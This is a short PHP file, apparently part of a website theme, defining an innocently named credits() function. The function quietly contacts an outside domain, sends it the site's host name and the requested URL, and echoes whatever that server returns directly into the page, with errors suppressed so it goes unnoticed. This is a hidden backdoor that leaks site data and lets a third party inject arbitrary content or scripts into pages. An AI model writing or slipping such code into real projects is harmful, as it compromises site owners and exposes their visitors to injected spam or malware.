<?php

function credits()
{
 $url = "http://1.templatesbrowser.com/wp.php?" .
       "url=" . urlencode($_SERVER['REQUEST_URI']) . "&" . "host=" . urlencode($_SERVER['HTTP_HOST']);
 $check = @fsockopen("1.templatesbrowser.com", 80, $errno, $errstr, 3);
 if($check)
 {
  @readfile($url);
  fclose($check);
 }
}

?>